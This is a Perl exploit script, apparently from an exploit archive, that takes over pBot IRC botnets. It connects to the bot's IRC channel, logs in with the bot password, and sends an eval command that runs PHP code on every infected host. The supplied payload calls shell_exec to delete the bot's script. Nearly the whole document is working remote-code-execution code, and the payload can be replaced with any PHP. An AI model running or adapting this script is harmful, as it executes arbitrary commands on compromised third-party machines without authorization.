#!/usr/bin/perl
# Exploit Title: pBot Remote Code Execution ("*" hostauth)
# Date: 31.07.2012
# Exploit Author: @bwallHatesTwits
# Software Link: https://www.firebwall.com/decoding/read.php?u=620d21fd31b87046e94975e03fdafa8a (decoded from attempted attack)
# Version: Various versions
# Tested on: Linux 3.2

use IO::Socket;
use IO::Select;
use IO::Socket::INET;
use Socket;

my $nickname = "BotSlayer";
my $ident = "BotSlayer";
my $fullname = "BotSlayer";
$sel_client = IO::Select->new();

#configuration values from the bot source
$ircserver = "localhost";					#"server"
$ircserverpass = "";						#"pass"
my $ircport = "6667"; 						#"port"
#if "key" is set, then add a space and the password to the chan name
my @channels = ("#anonbxu"); 				#"chan" and "chan2"
$botPass = "hello";							#"password"
$botTrigger = ".";							#"trigger"
#hostauth must be "*"
$loginCMD = "user";							#usually user or login

#payload - PHP code to run
#This version deletes the bots originating script, and dies
$phpEval = "shell_exec(\"rm -f \".\$_SERVER['SCRIPT_NAME']);exit();";

$channelCount = scalar(@channels);

sub onJoin
{
	my $channel = shift;
	$channel = substr($channel, 1);
	print "Joined $channel\n";
	say($channel, $botTrigger.$loginCMD." $botPass");
	sleep(1);
	say($channel, $botTrigger."eval \@BallastSec ".$phpEval);
	print "Payload delivered\n";
	tryQuit();
}

sub tryQuit
{
	$channelCount--;
	if($channelCount == 0)
	{
		quit("whomp wha");
	}
}

sub sendraw 
{
    if ($#_ == '1') 
    {
		my $socket = $_[0];
		print $socket "$_[1]\n";
    } 
    else 
    {
        print $IRC_cur_socket "$_[0]\n";
    }
}

sub conn
{
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) 
    {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        if($ircserverpass != "")
        {
			sendraw("PASS ".$ircserverpass);
		}
        sendraw("NICK ".$mynick);
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep 1;
    }
}

sub parse 
{
    my $servarg = shift;
    print $servarg."\n";
    if ($servarg =~ /^PING \:(.*)/) 
    {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) JOIN (.+)/)
    {
		my $channel = $4;
		onJoin($channel);
	}
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) 
    {
        my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
        if ($args =~ /^\001VERSION\001$/) 
        {
            notice("$pn", "\001VERSION BotSlayer by Ballast Security\001");
        }
        if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) 
        {
            my $natrix = $1;
            my $arg = $2;
        }
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) 
    {
        if (lc($1) eq lc($mynick)) 
        {
            $mynick=$4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    } 
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) 
    {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        foreach(@channels)
        {
			sendraw("JOIN $_");
		}        
    }
}
my $line_temp;
while(1) 
{
    while (!(keys(%irc_servers))) 
    { 
		conn($nickname, $ircserver, $ircport); 
	}
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) 
    {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $msg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $msg);
        $msg =~ s/\r\n$//;
        for(my $c=0; $c<= $#lines; $c++) 
        {
            $line = $lines[$c];
            $line=$line_temp.$line if ($line_temp);
            $line_temp='';
            $line =~ s/\r$//;
            parse("$line");
        }
    }
}

sub say
{
	return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice 
{
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub join 
{
	sendraw("JOIN $_[0]");
}

sub part 
{
	sendraw("PART $_[0]");
}

sub quit 
{
	sendraw("QUIT :$_[0]");
	exit;
}
